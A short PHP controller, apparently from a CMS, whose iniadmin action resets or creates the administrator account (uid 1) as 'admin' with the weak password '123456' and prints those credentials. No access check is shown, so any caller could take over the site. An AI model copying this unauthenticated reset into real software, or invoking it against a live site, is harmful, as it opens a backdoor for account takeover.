<?php
class UpdateAction extends IniAction{
    public function iniadmin(){
	    if(M('member')->where('uid=1')->find()){
			M('member')->where('uid=1')->save(array('uname'=>'admin','password'=>'e10adc3949ba59abbe56e057f20f883e','level'=>'1'));			
			exit("修改管理员用户名“admin”,密码“123456”");
		}else{
			M('member')->add(array('uid'=>1,'uname'=>'admin','password'=>'e10adc3949ba59abbe56e057f20f883e','level'=>'1','ctime'=>TIME));
			exit("新增管理员用户名“admin”,密码“123456”");
		}        
    }
}